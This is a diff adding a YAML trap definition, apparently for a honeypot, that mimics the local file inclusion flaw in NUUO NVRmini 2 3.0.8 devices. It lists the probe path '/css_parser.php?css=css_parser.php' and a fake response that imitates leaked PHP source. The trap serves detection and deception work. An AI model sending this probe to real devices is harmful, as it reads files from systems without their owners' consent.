@@ -1,0 +1,25 @@
+id: nuuo-file-inclusion
+info:
+  name: NUUO NVRmini 2 3.0.8 - Local File Inclusion
+  author: princechaddha
+  description: NUUO NVRmini 2 3.0.8 is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://www.exploit-db.com/exploits/40211
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: lfi,edb,nuuo
+traps:
+- request:
+    method: GET
+    path: /css_parser.php?css=css_parser.php
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: $_GET['css']
